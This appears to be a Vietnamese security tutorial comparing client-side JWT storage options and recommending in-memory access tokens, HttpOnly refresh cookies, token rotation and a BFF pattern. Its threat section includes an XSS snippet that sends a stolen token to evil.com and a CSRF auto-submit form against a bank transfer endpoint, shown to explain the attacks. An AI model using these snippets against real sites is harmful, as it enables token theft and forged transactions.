---
title: "Lưu trữ JWT ở đâu trên client là best practice"
date: 2026-03-19 21:38:00 +0700
categories: [Web Security, Authentication]
tags: [jwt, token-storage, xss, csrf, httponly-cookie, refresh-token, best-practice]
---

# Lưu Trữ JWT Ở Đâu Cho An Toàn? — Hướng Dẫn Chi Tiết Cho Frontend Developer

> **TL;DR:** Không có giải pháp hoàn hảo. Mỗi cách lưu trữ JWT ở client-side đều có trade-off riêng. Bài viết này sẽ phân tích từng phương pháp, so sánh ưu nhược điểm, và đưa ra best practice phù hợp với từng tình huống.

---

## 1. JWT Là Gì Và Tại Sao Cần Lưu Trữ?

JWT (JSON Web Token) là một chuỗi token được mã hóa, thường được server phát hành sau khi user đăng nhập thành công. Token này chứa thông tin xác thực (claims) và được client gửi kèm trong mỗi request tiếp theo để chứng minh danh tính.

**Vấn đề cốt lõi:** HTTP là stateless — server không "nhớ" ai đang gọi. Client cần lưu token ở đâu đó để gửi lại cho server mỗi lần request. Và chính nơi lưu trữ đó là điểm mà kẻ tấn công nhắm tới.

Một JWT điển hình gồm 3 phần, phân cách bởi dấu chấm:

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwiZXhwIjoxNzAwMDAwMDAwfQ.signature
│       Header       │              Payload              │  Signature  │
```

Khi token bị đánh cắp, kẻ tấn công có thể mạo danh user cho đến khi token hết hạn. Vì vậy, việc chọn nơi lưu trữ an toàn là cực kỳ quan trọng.

---

## 2. Các Phương Pháp Lưu Trữ JWT Ở Client-Side

### 2.1. localStorage

**Cách hoạt động:** Lưu token vào `window.localStorage`, dữ liệu tồn tại vĩnh viễn cho đến khi bị xóa thủ công.

```javascript
// Lưu token
localStorage.setItem('access_token', token);

// Đọc token
const token = localStorage.getItem('access_token');

// Gửi kèm request
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Xóa token (logout)
localStorage.removeItem('access_token');
```

**Ưu điểm:**

- Đơn giản, dễ implement, mọi developer đều quen thuộc.
- Dữ liệu persist qua các tab và sau khi đóng trình duyệt.
- Dung lượng lớn (~5-10MB).
- Không tự động gửi kèm request → miễn nhiễm CSRF.

**Nhược điểm:**

- **Lỗ hổng nghiêm trọng với XSS:** Bất kỳ đoạn JavaScript nào chạy trên trang đều có thể đọc `localStorage`. Nếu ứng dụng bị XSS, token bị lộ ngay lập tức.
- Đồng bộ (synchronous API) — có thể block main thread với dữ liệu lớn.
- Không có cơ chế hết hạn tự động.

**Trade-off:** Tiện lợi tối đa nhưng bảo mật tối thiểu trước XSS. Phù hợp cho các ứng dụng nội bộ, môi trường trusted, hoặc token có thời gian sống rất ngắn.

---

### 2.2. sessionStorage

**Cách hoạt động:** Tương tự `localStorage` nhưng dữ liệu chỉ tồn tại trong phiên trình duyệt hiện tại (tab/window). Đóng tab = mất token.

```javascript
// Lưu token
sessionStorage.setItem('access_token', token);

// Đọc token
const token = sessionStorage.getItem('access_token');
```

**Ưu điểm:**

- Tự động xóa khi đóng tab — giảm nguy cơ token bị lộ sau phiên làm việc.
- Mỗi tab có storage riêng biệt — tab bị XSS không ảnh hưởng tab khác.
- Không gửi tự động kèm request → miễn nhiễm CSRF.

**Nhược điểm:**

- Vẫn bị XSS đọc được trong cùng tab đó.
- Mở tab mới phải đăng nhập lại (trải nghiệm kém).
- Refresh trang vẫn giữ token (không thực sự "phiên" như nhiều người nghĩ).

**Trade-off:** An toàn hơn localStorage một chút (giới hạn phạm vi), nhưng đánh đổi trải nghiệm user. Token vẫn bị lộ nếu XSS xảy ra trong cùng tab.

---

### 2.3. Cookie (không có HttpOnly)

**Cách hoạt động:** Lưu token vào cookie thông thường mà JavaScript có thể đọc/ghi.

```javascript
// Lưu token vào cookie
document.cookie = `access_token=${token}; Secure; SameSite=Strict; Path=/; Max-Age=3600`;

// Đọc token từ cookie
function getCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? match[2] : null;
}

const token = getCookie('access_token');
```

**Ưu điểm:**

- Có thể đặt thời gian hết hạn (`Max-Age`, `Expires`).
- Hỗ trợ `SameSite` attribute để giảm thiểu CSRF.
- Tự động gửi kèm request đến cùng domain.

**Nhược điểm:**

- **Vẫn bị XSS đọc được** — vì không có `HttpOnly`.
- Dung lượng nhỏ (~4KB per cookie).
- **Dễ bị CSRF** nếu không cấu hình `SameSite` đúng cách.
- Gửi kèm mọi request (kể cả request không cần auth) → tốn bandwidth.

**Trade-off:** Kết hợp nhược điểm của cả hai thế giới — vừa bị XSS vừa có nguy cơ CSRF. **Đây là lựa chọn tệ nhất** và hầu như không nên dùng.

---

### 2.4. HttpOnly Cookie

**Cách hoạt động:** Server set cookie với flag `HttpOnly` — JavaScript hoàn toàn không thể truy cập cookie này. Browser tự động gửi cookie kèm mỗi request.

```
// Server response header (Node.js/Express ví dụ)
Set-Cookie: access_token=eyJhbGci...; 
  HttpOnly; 
  Secure; 
  SameSite=Strict; 
  Path=/api; 
  Max-Age=900;
  Domain=.example.com
```

```javascript
// Client-side: KHÔNG thể đọc token
console.log(document.cookie); // Không thấy access_token

// Nhưng browser tự động gửi cookie kèm request
fetch('/api/data', {
  credentials: 'include' // Bắt buộc để gửi cookie cross-origin
});
```

**Ưu điểm:**

- **Miễn nhiễm XSS hoàn toàn** — JavaScript không thể đọc, sửa, hay xóa cookie.
- Browser tự quản lý lifecycle (hết hạn, xóa).
- Hỗ trợ đầy đủ `Secure`, `SameSite`, `Domain`, `Path`.

**Nhược điểm:**

- **Dễ bị CSRF** nếu không có biện pháp phòng chống (SameSite, CSRF token).
- Phức tạp hơn khi làm việc với cross-origin API (cần cấu hình CORS cẩn thận).
- Client không biết token đã hết hạn cho đến khi nhận lỗi 401 từ server.
- Khó debug — không thể inspect token từ DevTools dễ dàng.
- Dung lượng giới hạn (~4KB).

**Trade-off:** Bảo vệ tốt nhất chống XSS nhưng cần thêm lớp phòng chống CSRF. Đây là phương pháp được khuyến nghị nhiều nhất bởi cộng đồng bảo mật.

---

### 2.5. In-Memory (biến JavaScript)

**Cách hoạt động:** Lưu token trong biến JavaScript (closure, state management, module scope). Token chỉ tồn tại trong bộ nhớ runtime của ứng dụng.

```javascript
// Sử dụng closure
const AuthService = (() => {
  let accessToken = null;

  return {
    setToken(token) {
      accessToken = token;
    },
    getToken() {
      return accessToken;
    },
    clearToken() {
      accessToken = null;
    }
  };
})();

// Hoặc trong React context/state
const AuthContext = React.createContext();

function AuthProvider({ children }) {
  const [accessToken, setAccessToken] = useState(null);
  
  // Token mất khi refresh trang
  // Dùng refresh token (HttpOnly cookie) để lấy lại
  useEffect(() => {
    fetch('/api/auth/refresh', { credentials: 'include' })
      .then(res => res.json())
      .then(data => setAccessToken(data.access_token))
      .catch(() => { /* redirect to login */ });
  }, []);

  return (
    <AuthContext.Provider value={{ accessToken, setAccessToken }}>
      {children}
    </AuthContext.Provider>
  );
}
```

**Ưu điểm:**

- **Bảo mật cao nhất trước XSS** — token không tồn tại ở bất kỳ storage nào mà XSS thường nhắm tới.
- Không bị CSRF (gửi qua header thủ công).
- Token tự động biến mất khi đóng tab/refresh.

**Nhược điểm:**

- **Mất token khi refresh trang** — cần cơ chế silent refresh (dùng refresh token trong HttpOnly cookie).
- Không persist qua các tab — mỗi tab cần tự lấy token riêng.
- Phức tạp hơn đáng kể trong implementation.
- Vẫn có thể bị XSS nâng cao đọc nếu attacker inject code trực tiếp vào runtime.

**Trade-off:** An toàn nhất nhưng phức tạp nhất. Cần kết hợp với refresh token flow để duy trì session.

---

### 2.6. Web Worker

**Cách hoạt động:** Lưu token bên trong Web Worker — một thread riêng biệt, hoàn toàn tách biệt khỏi DOM và main thread JavaScript.

```javascript
// auth-worker.js
let accessToken = null;

self.addEventListener('message', async (e) => {
  const { type, payload } = e.data;

  switch (type) {
    case 'SET_TOKEN':
      accessToken = payload.token;
      self.postMessage({ type: 'TOKEN_SET' });
      break;

    case 'FETCH':
      try {
        const response = await fetch(payload.url, {
          ...payload.options,
          headers: {
            ...payload.options?.headers,
            'Authorization': `Bearer ${accessToken}`
          }
        });
        const data = await response.json();
        self.postMessage({ type: 'FETCH_RESULT', payload: data });
      } catch (error) {
        self.postMessage({ type: 'FETCH_ERROR', payload: error.message });
      }
      break;

    case 'CLEAR_TOKEN':
      accessToken = null;
      break;
  }
});
```

```javascript
// main.js
const authWorker = new Worker('auth-worker.js');

// Lưu token
authWorker.postMessage({ type: 'SET_TOKEN', payload: { token: jwt } });

// Gọi API thông qua worker
authWorker.postMessage({
  type: 'FETCH',
  payload: { url: '/api/data', options: { method: 'GET' } }
});

authWorker.addEventListener('message', (e) => {
  if (e.data.type === 'FETCH_RESULT') {
    console.log(e.data.payload);
  }
});
```

**Ưu điểm:**

- **Cách ly hoàn toàn khỏi main thread** — XSS trên main thread không thể truy cập biến bên trong Worker.
- Token không bao giờ xuất hiện trong main thread scope.
- Không truy cập được từ `document`, `window`, hay bất kỳ Web API nào liên quan đến DOM.

**Nhược điểm:**

- Phức tạp rất cao — mọi API call phải đi qua Worker messaging.
- Mất token khi refresh trang (giống in-memory).
- Khó debug, khó test.
- Overhead communication qua `postMessage`.
- Nếu XSS có thể kiểm soát Worker (inject code vào Worker script), thì vẫn bị lộ.
- Không hoạt động trong một số môi trường (SSR, một số trình duyệt cũ).

**Trade-off:** Bảo mật cực cao nhưng chi phí implementation và maintenance cũng cực cao. Phù hợp cho ứng dụng tài chính, y tế, hoặc hệ thống cần bảo mật tối đa.

---

## 3. Hiểu Về Các Mối Đe Dọa

Trước khi chọn phương pháp, bạn cần hiểu rõ hai mối đe dọa chính mà mỗi cách lưu trữ phải đối mặt.

### 3.1.1. XSS — Cross-Site Scripting

**Cơ chế tấn công:** Kẻ tấn công chèn mã JavaScript độc hại vào trang web của bạn. Mã này chạy với đầy đủ quyền hạn của ứng dụng, có thể đọc mọi thứ mà JavaScript truy cập được.

```javascript
// Kẻ tấn công chèn script này vào trang (qua input không sanitize, third-party script, v.v.)
const stolenToken = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Ảnh hưởng đến từng phương pháp:**

- **localStorage / sessionStorage / Cookie thường:** Token bị đánh cắp trực tiếp. Attacker có thể gửi token về server của mình và sử dụng từ bất kỳ đâu.
- **HttpOnly Cookie:** Token KHÔNG bị đọc. Tuy nhiên, XSS vẫn có thể gửi request kèm cookie (vì browser tự gửi), nhưng attacker không thể lấy token ra ngoài trình duyệt.
- **In-Memory / Web Worker:** Token khó bị truy cập hơn, nhưng XSS tinh vi vẫn có thể hijack các function đang sử dụng token.

**Điểm quan trọng:** HttpOnly cookie không ngăn XSS thực hiện hành động xấu (gửi request thay user), nhưng ngăn token bị exfiltrate (đánh cắp ra bên ngoài trình duyệt). Đây là sự khác biệt rất quan trọng — nếu bạn phát hiện và fix XSS, token trong HttpOnly cookie vẫn an toàn, còn token trong localStorage đã bị lộ vĩnh viễn.

---

### 3.2. CSRF — Cross-Site Request Forgery

**Cơ chế tấn công:** Kẻ tấn công lừa browser của user gửi request đến server của bạn từ một trang web khác. Vì browser tự động gửi cookie, server không phân biệt được request hợp lệ và request giả mạo.

```html
<!-- Trên trang evil.com -->
<form action="https://your-bank.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

**Ảnh hưởng đến từng phương pháp:**

- **localStorage / sessionStorage / In-Memory / Web Worker:** Miễn nhiễm CSRF — token được gửi qua header `Authorization`, không tự động gửi cross-origin.
- **Cookie (mọi loại):** Dễ bị CSRF vì browser tự động đính kèm cookie.

**Biện pháp phòng chống CSRF cho cookie:**

```
// 1. SameSite attribute (hàng phòng thủ đầu tiên)
Set-Cookie: token=...; SameSite=Strict  // Không gửi cookie từ cross-site request
Set-Cookie: token=...; SameSite=Lax     // Chỉ gửi với top-level navigation (GET)

// 2. CSRF Token (hàng phòng thủ thứ hai)
// Server tạo CSRF token riêng, gửi qua response body hoặc meta tag
// Client gửi CSRF token qua custom header — header này KHÔNG tự động gửi
```

```javascript
// Ví dụ CSRF token pattern
// Server render CSRF token vào HTML
// <meta name="csrf-token" content="random-csrf-token-here">

const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': csrfToken  // Custom header — chỉ same-origin mới gửi được
  },
  body: JSON.stringify({ to: 'friend', amount: 100 })
});
```

---

## 4. Best Practice: Chiến Lược Kết Hợp

Không có phương pháp đơn lẻ nào hoàn hảo. Best practice là **kết hợp nhiều phương pháp** để tận dụng ưu điểm và bù đắp nhược điểm cho nhau.

### 5.1. Mô Hình BFF (Backend For Frontend)

Đây là mô hình được khuyến nghị cao nhất cho ứng dụng production, đặc biệt là SPA.

**Kiến trúc:**

```
┌─────────────┐    HttpOnly Cookie     ┌─────────────┐    JWT Bearer     ┌──────────────┐
│   Browser    │ ◄──────────────────►   │  BFF Server  │ ◄──────────────► │  API Server   │
│   (SPA)      │   Session/Opaque Token │  (Your App)  │   Access Token   │  (Resource)   │
└─────────────┘                         └─────────────┘                    └──────────────┘
```

**Nguyên tắc:** Browser không bao giờ nhìn thấy JWT. BFF server giữ JWT và chỉ cấp cho browser một session ID hoặc opaque token qua HttpOnly cookie.

```javascript
// BFF Server (Node.js/Express)
app.post('/auth/login', async (req, res) => {
  // 1. Gọi Auth Server lấy JWT
  const { access_token, refresh_token } = await authServer.login(req.body);
  
  // 2. Lưu JWT vào server-side session (Redis, DB, v.v.)
  req.session.accessToken = access_token;
  req.session.refreshToken = refresh_token;
  
  // 3. Trả về session ID qua HttpOnly cookie (browser không thấy JWT)
  res.cookie('session_id', req.sessionID, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000, // 24 giờ
    path: '/'
  });
  
  res.json({ user: { name: '...', email: '...' } });
});

// Proxy API calls
app.use('/api', async (req, res) => {
  const jwt = req.session.accessToken;
  
  // Forward request đến API server kèm JWT
  const response = await fetch('https://api.example.com' + req.path, {
    headers: { 'Authorization': `Bearer ${jwt}` }
  });
  
  res.json(await response.json());
});
```

**Ưu điểm:** JWT không bao giờ xuất hiện ở client → miễn nhiễm XSS token theft hoàn toàn. Browser chỉ giữ session ID vô nghĩa nếu bị đánh cắp mà không có server session.

**Nhược điểm:** Cần thêm một server layer (BFF). Phức tạp hơn trong deployment và scaling.

---

### 5.2. Mô Hình Access Token + Refresh Token

Đây là best practice phổ biến nhất khi **không có BFF** — phù hợp cho hầu hết ứng dụng SPA.

**Nguyên tắc:**

- **Access Token** (ngắn hạn, 5-15 phút): Lưu **in-memory** → bảo mật cao, chấp nhận mất khi refresh.
- **Refresh Token** (dài hạn, 7-30 ngày): Lưu **HttpOnly Secure cookie** → persist qua refresh, chống XSS.

```
┌────────────────────── Luồng hoạt động ──────────────────────┐
│                                                             │
│  1. User đăng nhập                                          │
│     └─► Server trả access_token (body) + refresh_token (cookie)  │
│                                                              │
│  2. Mỗi API call                                             │
│     └─► Client gửi: Authorization: Bearer <access_token>     │
│                                                              │
│  3. Access token hết hạn (401)                               │
│     └─► Client gọi /auth/refresh (cookie tự gửi)             │
│     └─► Server trả access_token mới                          │
│                                                              │
│  4. Refresh trang                                            │
│     └─► Access token mất (in-memory)                         │
│     └─► Tự động gọi /auth/refresh để lấy lại                 │
│                                                              │
│  5. Refresh token hết hạn                                    │
│     └─► Redirect về trang đăng nhập                          │
└──────────────────────────────────────────────────────────────┘
```

**Server-side implementation:**

```javascript
// Login endpoint
app.post('/auth/login', async (req, res) => {
  const user = await validateCredentials(req.body);
  
  // Access token — ngắn hạn
  const accessToken = jwt.sign(
    { sub: user.id, role: user.role },
    ACCESS_SECRET,
    { expiresIn: '15m' }
  );
  
  // Refresh token — dài hạn
  const refreshToken = jwt.sign(
    { sub: user.id, tokenVersion: user.tokenVersion },
    REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // Refresh token → HttpOnly cookie
  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,
    secure: true,              // Chỉ gửi qua HTTPS
    sameSite: 'strict',        // Chống CSRF
    path: '/auth/refresh',     // Chỉ gửi đến endpoint refresh
    maxAge: 7 * 24 * 60 * 60 * 1000
  });
  
  // Access token → response body (client lưu in-memory)
  res.json({ access_token: accessToken, user: { name: user.name } });
});

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refresh_token;
  
  try {
    const payload = jwt.verify(refreshToken, REFRESH_SECRET);
    const user = await db.findUser(payload.sub);
    
    // Kiểm tra token version (cho phép invalidate tất cả refresh tokens)
    if (payload.tokenVersion !== user.tokenVersion) {
      throw new Error('Token revoked');
    }
    
    const newAccessToken = jwt.sign(
      { sub: user.id, role: user.role },
      ACCESS_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({ access_token: newAccessToken });
  } catch (err) {
    res.clearCookie('refresh_token');
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

**Client-side implementation:**

```javascript
// auth.js — quản lý token in-memory
let accessToken = null;
let refreshPromise = null;

export function setAccessToken(token) {
  accessToken = token;
}

export function getAccessToken() {
  return accessToken;
}

// Silent refresh — gọi khi app khởi động và khi token hết hạn
export async function silentRefresh() {
  // Đảm bảo chỉ có 1 refresh request tại một thời điểm
  if (refreshPromise) return refreshPromise;
  
  refreshPromise = fetch('/auth/refresh', {
    method: 'POST',
    credentials: 'include' // Gửi HttpOnly cookie
  })
  .then(res => {
    if (!res.ok) throw new Error('Refresh failed');
    return res.json();
  })
  .then(data => {
    accessToken = data.access_token;
    
    // Lên lịch refresh trước khi token hết hạn (trước 1 phút)
    const payload = JSON.parse(atob(data.access_token.split('.')[1]));
    const expiresIn = payload.exp * 1000 - Date.now() - 60000;
    setTimeout(silentRefresh, expiresIn);
    
    return accessToken;
  })
  .finally(() => {
    refreshPromise = null;
  });
  
  return refreshPromise;
}

// Fetch wrapper — tự động refresh khi 401
export async function authFetch(url, options = {}) {
  let token = getAccessToken();
  
  if (!token) {
    token = await silentRefresh();
  }
  
  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'Authorization': `Bearer ${token}`
    }
  });
  
  // Token hết hạn → refresh và retry
  if (response.status === 401) {
    token = await silentRefresh();
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
  }
  
  return response;
}
```

---

### 5.3. Token Rotation

Token Rotation là kỹ thuật bổ sung để tăng cường bảo mật cho refresh token.

**Nguyên tắc:** Mỗi lần dùng refresh token để lấy access token mới, server cũng phát hành refresh token mới và vô hiệu hóa refresh token cũ.

```javascript
// Server-side refresh với rotation
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refresh_token;
  
  try {
    const payload = jwt.verify(oldRefreshToken, REFRESH_SECRET);
    
    // Kiểm tra token có trong whitelist không
    const storedToken = await redis.get(`refresh:${payload.sub}`);
    if (storedToken !== oldRefreshToken) {
      // Token đã bị dùng lại → có thể bị đánh cắp!
      // Vô hiệu hóa TẤT CẢ refresh tokens của user này
      await redis.del(`refresh:${payload.sub}`);
      await db.incrementTokenVersion(payload.sub);
      
      res.clearCookie('refresh_token');
      return res.status(401).json({ 
        error: 'Token reuse detected — all sessions revoked' 
      });
    }
    
    // Tạo tokens mới
    const newAccessToken = jwt.sign(/* ... */);
    const newRefreshToken = jwt.sign(/* ... */);
    
    // Lưu refresh token mới, xóa cái cũ
    await redis.set(`refresh:${payload.sub}`, newRefreshToken, 'EX', 7 * 86400);
    
    // Gửi refresh token mới qua cookie
    res.cookie('refresh_token', newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      path: '/auth/refresh',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });
    
    res.json({ access_token: newAccessToken });
  } catch (err) {
    res.clearCookie('refresh_token');
    res.status(401).json({ error: 'Invalid token' });
  }
});
```

**Lợi ích:** Nếu refresh token bị đánh cắp, kẻ tấn công chỉ dùng được 1 lần. Lần tiếp theo, hoặc user hoặc attacker sẽ dùng token cũ, và server sẽ phát hiện token reuse → revoke tất cả.

---

## 6. Kết Luận

### Tóm tắt khuyến nghị theo mức độ bảo mật:

**Mức cơ bản (app nội bộ, prototype):** `localStorage` + access token ngắn hạn. Đơn giản, nhanh, chấp nhận rủi ro XSS.

**Mức trung bình (hầu hết production app):** Access token **in-memory** + Refresh token **HttpOnly cookie** + Token Rotation. Cân bằng tốt giữa bảo mật và độ phức tạp.

**Mức cao (tài chính, y tế, dữ liệu nhạy cảm):** Mô hình **BFF** — JWT không bao giờ rời server. Client chỉ giữ opaque session ID qua HttpOnly cookie. Kết hợp fingerprinting và token rotation.

### Nguyên tắc vàng:

1. **Không có giải pháp hoàn hảo** — mọi phương pháp đều có trade-off. Hãy chọn dựa trên mức độ nhạy cảm của dữ liệu.
2. **XSS là kẻ thù lớn nhất** — nếu ứng dụng bị XSS, gần như mọi cách lưu trữ đều có thể bị khai thác ở mức độ nào đó. Phòng chống XSS phải là ưu tiên số một.
3. **Defense in depth** — đừng dựa vào một lớp bảo vệ duy nhất. Kết hợp nhiều biện pháp: HttpOnly cookie + SameSite + CSP + token rotation + fingerprinting.
4. **Ngắn hạn hơn = an toàn hơn** — access token càng ngắn hạn, thiệt hại khi bị lộ càng nhỏ.
5. **Principle of least privilege** — token chỉ nên chứa thông tin tối thiểu cần thiết, cookie chỉ gửi đến path cần thiết, quyền truy cập chỉ cấp đúng mức cần thiết.

---
